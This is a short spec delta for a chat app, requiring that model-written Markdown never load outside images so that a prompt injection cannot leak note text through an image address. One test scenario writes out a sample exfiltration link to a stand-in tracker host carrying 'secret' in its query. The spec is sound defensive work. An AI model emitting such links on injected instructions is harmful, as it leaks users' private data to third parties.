# Spec Delta

## ADDED Requirements

### Requirement: Model Markdown loads no outside images
Markdown written by a model and shown in the chat (answers, and text inside interactive surfaces) SHALL NOT load images from outside the app. An image whose address is not on the app's own origin or a `data:` image MUST be shown as a placeholder with its alt text and address as plain text, with no request made. A prompt injection in a note must not be able to send note text to a third party through an image address.

#### Scenario: Outside image in an answer
- **WHEN** an answer contains `![chart](https://tracker.example/p.png?d=secret)`
- **THEN** the browser makes no request to `tracker.example`, and the answer shows the alt text and the address as text

#### Scenario: App image in an answer
- **WHEN** an answer contains `![logo](/brand/logo-mark.svg)`
- **THEN** the image is shown
